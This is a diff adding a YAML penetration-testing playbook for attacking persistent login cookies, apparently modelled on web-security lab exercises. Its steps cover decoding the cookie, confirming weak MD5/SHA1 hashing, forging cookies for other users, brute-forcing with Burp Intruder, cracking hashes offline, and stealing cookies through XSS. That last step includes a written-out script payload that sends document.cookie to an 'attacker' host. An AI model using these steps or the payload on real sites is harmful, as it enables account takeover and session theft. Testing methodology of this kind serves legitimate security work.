@@ -1,0 +1,138 @@
+name: web.auth.cookie
+
+steps:
+
+  - id: detect_cookie
+    title: Identify Persistent Login Cookie
+
+    info: |
+      Look for "remember me" or persistent session cookies.
+
+    checklist:
+      - Log in with "remember me" enabled
+      - Observe new cookies in response
+      - Check if cookie persists after logout/browser close
+
+    commands:
+      - Inspect cookies in Burp Proxy / Browser DevTools
+
+
+  - id: analyze_cookie
+    title: Analyze Cookie Structure
+
+    info: |
+      Determine how the cookie is constructed.
+
+    checklist:
+      - Check if Base64 encoded
+      - Decode cookie value
+      - Identify patterns (username, hash, timestamp)
+      - Check for weak hashing (MD5/SHA1)
+
+    commands:
+      - Send cookie to Burp Decoder
+      - Decode Base64
+      - "Identify format: username:hash"
+
+
+  - id: confirm_hash_logic
+    title: Confirm Hash Logic
+
+    info: |
+      Verify if cookie uses predictable hashing.
+
+    checklist:
+      - Hash your own password (MD5/SHA1)
+      - Compare with cookie value
+      - Confirm construction pattern
+
+    commands:
+      - "echo -n password | md5sum"
+      - Compare with decoded cookie
+
+    success:
+      - Hash algorithm confirmed
+      - Cookie construction understood
+
+
+  - id: test_other_user
+    title: Target Another User
+
+    info: |
+      Attempt to access another user's account via cookie.
+
+    checklist:
+      - Replace username in cookie
+      - Reuse same hash format
+      - Look for authenticated response
+
+    commands:
+      - Modify cookie prefix to victim username
+      - Replay request
+
+    success:
+      - Access granted as another user
+
+
+  - id: brute_force_cookie
+    title: Cookie Brute Force
+
+    info: |
+      Attempt to generate valid cookies for other users.
+
+    checklist:
+      - Send request with cookie to Intruder
+      - Add password wordlist
+      - Apply payload processing:
+        - Hash
+        - Add prefix (username:)
+        - Base64 encode
+      - Monitor for valid responses
+
+    commands:
+      - Send request with cookie to Burp Intruder
+      - Add payload processing rules
+      - Use grep match (e.g. "Update email")
+
+    success:
+      - Valid cookie generated
+      - Authenticated response
+
+
+  - id: offline_crack
+    title: Offline Password Cracking
+
+    info: |
+      Extract hash from cookie and crack offline.
+
+    checklist:
+      - Decode cookie
+      - Extract hash
+      - Identify hash type
+      - Crack using wordlist
+
+    commands:
+      - Use hashcat / john
+      - Search hash online
+
+    success:
+      - Password recovered
+
+
+  - id: steal_cookie_xss
+    title: Cookie Theft (XSS)
+
+    info: |
+      Use XSS to extract another user's cookie.
+
+    checklist:
+      - Identify XSS injection point
+      - Send payload to exfiltrate cookies
+      - Capture cookie on exploit server
+
+    commands:
+      - "<script>document.location='//attacker/'+document.cookie</script>"
+
+    success:
+      - Session cookie captured
+      - Access as victim user
